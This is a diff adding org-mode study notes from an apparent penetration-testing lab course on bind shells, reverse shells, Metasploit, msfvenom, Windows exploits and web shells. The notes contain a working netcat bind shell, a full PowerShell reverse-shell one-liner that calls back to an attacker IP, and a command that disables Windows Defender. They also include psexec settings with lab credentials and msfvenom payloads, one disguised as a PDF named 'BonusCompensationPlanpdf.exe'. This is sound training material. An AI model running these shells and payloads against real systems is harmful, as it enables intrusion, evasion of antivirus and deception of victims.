@@ -5,3 +5,263 @@
 #+OPTIONS: toc:2
 
 * TOC :toc:
+- [[#bind-shells][Bind Shells]]
+  - [[#practice-w-gnu-netcat][Practice w GNU netcat]]
+  - [[#establishing-basic-bind-shell-w-netcat][Establishing basic bind shell w netcat]]
+- [[#reverse-shells][Reverse Shells]]
+  - [[#reverse-shell-in-windows][Reverse Shell in Windows]]
+  - [[#automating-payloads--delivery-w-metasploit][Automating Payloads & Delivery w Metasploit]]
+- [[#crafting-payloads][Crafting Payloads]]
+  - [[#msfvenom][MSFvenom]]
+  - [[#building-stageless-payload][Building stageless payload]]
+  - [[#executing-stageless-payload][Executing stageless payload]]
+  - [[#stageless-payload-for-windows][Stageless payload for windows]]
+- [[#infilrating-windows][Infilrating Windows]]
+  - [[#prominent-windows-exploits][Prominent Windows Exploits]]
+  - [[#enumerating-windows--fingerprinting-methods][Enumerating Windows & Fingerprinting Methods]]
+  - [[#creating-payload][Creating Payload]]
+- [[#web-shells][Web Shells]]
+  - [[#laudanum][Laudanum]]
+  - [[#antak-webshell][Antak Webshell]]
+  - [[#php-web-shell][PHP Web Shell]]
+- [[#detection--prevention][Detection & Prevention]]
+  - [[#monitoring][Monitoring]]
+
+* Bind Shells
+- target system has listener started -> awaits connection from pentester's sys
+- connect directly w =IP addr= & =port= listening on target.
+
+*** challenges associated 
+- needs to be listener already started on target
+- admins usually configure strict incoming firewall rules and =NAT= (w =PAT= impl) on the edge of the network (public facing) -> need to be on internal network
+- OS firewalls will most probably block most incoming connections which aren't associated w trusted network-based applications.
+
+** Practice w GNU netcat
+*** Server-target starting nc listener
+~nc -lvnp 7777~
+*** client-attack connecting to target
+~nc -nv 10.129.41.200 7777~
+*** server-target rcving connection from client
+*** attack box sending message 
+*** target rcving message
+** Establishing basic bind shell w netcat
+*** Server -> binding bash shell to TCP session
+#+begin_src bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+nc -nv <ip> 7777
+#+end_src
+- ~-i~ -> interactive shell
+- ~2>&1~ -> merges stderr into stdout (errs also go through pipe)
+**** 0 -> stdin
+**** 1 -> stdout
+**** 2 -> stderr
+
+* Reverse Shells 
+- attack box will have listener running, target will need to init connection
+- [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md][Reverse Shell Cheat Sheet]]
+
+** Reverse Shell in Windows
+
+*** TODO Attack Box 
+~sudo nc -lvnp 443~
+- use common ports to avoid being blocked by OS firewall and at network lvl
+- firewall capable of deep packet inspection, layer 7 visibilit may e able to detect & stop rev shell g going outbound of common port
+
+# to use netcat on wind, need to transfer netcat bin
+
+#+begin_src powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+#+end_src
+*** How this works
+**** calling powershell
+~powershell -nop -c~
+- ~-nop~ -> no profile
+- ~-c~ -> exec cmd/script in ""
+
+**** Binding Socket
+~"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);~
+- evaluates var =$client= = =New-Object= -> creates instance of =System.Net.Sockets.TCPClient= .NET framework object.
+- object will connect w TCP socket in (). 
+- ~;~ -> code exec sequentially
+
+**** Setting cmd stream
+~$stream = $client.GetStream();~
+
+**** Empty Byte Stream
+- ~[byte[]]$bytes = 0..65535|%{0};~
+- creates byte type arr (=[]=) -> =$bytes=
+- returns 65535 zeros as vals in arr.
+- empty byte stream -> directed to TCP listener 
+
+**** Stream Params
+~while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)~
+- starts while loop containing =$i= = =Stream.Read=
+- params: buffer (=$bytes=), offset (=10=), count (=$bytes.Length)=
+
+**** Set Byte Encoding
+~{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);~
+
+**** Invoke Expression
+~$sendback = (iex $data 2>&1 | Out-String );~
+
+**** Show working directory
+~$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';~
+
+**** Set Sendbyte
+~$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}~
+
+**** Terminate TCP 
+~$client.Close()"~
+
+- [[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1][nishang project]]
+  
+*** disable AV
+#+begin_src PS
+PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
+#+end_src
+
+
+** Automating Payloads & Delivery w Metasploit
+
+*** SMB
+- [[https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/][Rapid 7 Module Documentation]]
+
+*** Options
+#+begin_src bash
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
+RHOSTS => 10.129.180.71
+msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
+SHARE => ADMIN$
+msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
+SMBPass => HTB_@cademy_stdnt!
+msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
+SMBUser => htb-student
+msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
+LHOST => 10.10.14.222
+#+end_src
+
+
+* Crafting Payloads
+- using automated attacks in metasploit req us to reach vuln target over network.
+  1. Run exploit midule
+  2. deliver payloads
+  3. establish shell session
+- need to communicate first
+
+** MSFvenom
+**** list payloads
+~msfvenom -l~
+
+** Building stageless payload
+#+begin_src bash
+biscuitrescue@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+#+end_src
+
+** Executing stageless payload
+- get it on the system
+
+*** NC Connection
+~sudo nc -lvnp 443~
+
+** Stageless payload for windows
+#+begin_src bash
+biscuitrescue@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+#+end_src>
+
+* Infilrating Windows
+- [[https://www.cvedetails.com/vendor/26/Microsoft.html][MS vuln stats]]
+
+** Prominent Windows Exploits
+
+*** MS08-067
+- SMB flaw
+- made it easy to infiltrate windows host
+- efficient
+- conficker worm used it 
+- stuxnet took advantage
+
+*** Eternal Blue (MS17-010)
+- leaked in shadow brokers dump from NSA
+- Wannacry, NotPetya
+- flaw in SMB v1 allowing for code exec
+  
+*** PrintNightmare
+- RCE in Windows Print Spooler
+- With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host
+- [[https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html][post]]
+
+*** BlueKeep
+- CVE 2019-0708
+- RDP -> RCE
+- took adv of miss-called channel to gain code exec.
+- windwos 2000 -> Server 2008 R2
+
+*** SigRed
+- flaw in how DNS reads SIG resource records
+- domain admin privileges
+
+*** SeriousSam
+CVE 2021-36934 exploits an issue with the way Windows handles permission on the C:\Windows\system32\config folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.
+
+*** Zerologon
+CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.
+
+** Enumerating Windows & Fingerprinting Methods
+
+**** Time to Live (TTL)
+counter when ICMP.
+- Typpical response from win host = 32/128
+- around 128 = most common
+- [[https://subinsb.com/default-device-ttl-values/][Default Device TTL]] (outdated)
+
+**** Nmap
+
+** Creating Payload
+**** DLL
+- Dynamic Linking library
+- lib file -> provide shared code/data which can be used my diff programs.
+**** Batch
+- test-based DOS scripts
+- =.bat=
+- can be used to run automated cmds
+**** VBS
+- client-side scripting lang in webservers.
+- dynamic web pages.
+**** MSI
+- installation db for windows installer.
+**** Powershell
+- based on .NET Common Language Runtime
+- takes i/o as .NET objects
+
+*** Payload Generation
+
+* Web Shells
+** Laudanum
+- repo of ready made files -> inject onto victim and rcv back access via revshell
+- copy files as is & place on victim
+** Antak Webshell
+*** ASPX
+- ft for ASP.NET framework
+*** Antak Webshell
+- uses powershell to interact w host
+- included w nishang project
+** PHP Web Shell
+- WWW php
+
+* Detection & Prevention
+** Monitoring
+- [[https://attack.mitre.org/][MITRE ATT&CK Framework]]
+  - techniques & tactics used by attackers
+  - Globally accessible knowledge base of adversary tactics & tehcniques based on real-world observations
